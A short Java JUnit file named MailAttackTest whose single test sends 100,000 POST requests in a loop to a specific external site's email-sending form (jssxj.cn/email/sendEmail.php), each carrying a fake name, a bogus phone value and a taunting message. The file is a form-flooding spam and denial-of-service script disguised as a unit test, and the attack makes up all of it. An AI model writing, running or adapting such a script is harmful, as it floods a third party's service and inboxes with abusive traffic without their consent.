package com.supervisor.sms;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import org.apache.http.client.ClientProtocolException;
import org.junit.After;
import org.junit.Test;

import com.supervisor.httpclient.HttpClient;

public class MailAttackTest
{
    
    @After
    public void tearDown() throws Exception
    {
    }
    
    @Test
    public void test() throws ClientProtocolException, IOException
    {
        HttpClient client = new HttpClient();
        Map<String, String> params = new HashMap<>();
        params.put("name", "张健");
        params.put("phone", "超级电话");
        params.put("content", "你猜我是谁,BEAR BEAR BEAR");
        int count = 100000;
        for (int i = 0; i < count; i++)
        {
            client.post("http://www.jssxj.cn/email/sendEmail.php", params);
            System.out.println(i + "---------Sent");
        }
    }
    
}
